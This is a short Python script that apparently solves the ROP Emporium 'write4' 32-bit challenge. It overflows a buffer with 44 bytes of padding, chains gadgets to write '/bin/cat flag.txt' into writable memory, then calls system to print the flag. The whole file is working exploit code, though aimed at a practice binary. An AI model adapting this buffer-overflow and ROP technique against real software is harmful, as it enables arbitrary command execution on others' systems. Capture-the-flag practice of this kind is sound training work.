#!/usr/bin/python

import struct, os

free_addr = 0x0804a02a
system = struct.pack('<L', 0x0804865a)		#from usefulFunction, no exit
r1 = struct.pack('<L', 0x080486da)		#pop edi ; pop ebp ; ret
r2 = struct.pack('<L', 0x0804866e)		#nop ; nop ; mov dword ptr [edi], ebp ; ret
string = "/bin/cat flag.txt\0\0\0"
rop = ""

for i in range(0, 5):
    value = struct.unpack('<L', string[i*4:i*4+4])[0]
    rop += r1 + struct.pack('<L', free_addr + i*4) + struct.pack('<L', value) + r2  

payload = "A"*44 + rop + system + struct.pack('<L', free_addr)

write4 = os.popen('./write432', 'w')
write4.write(payload)
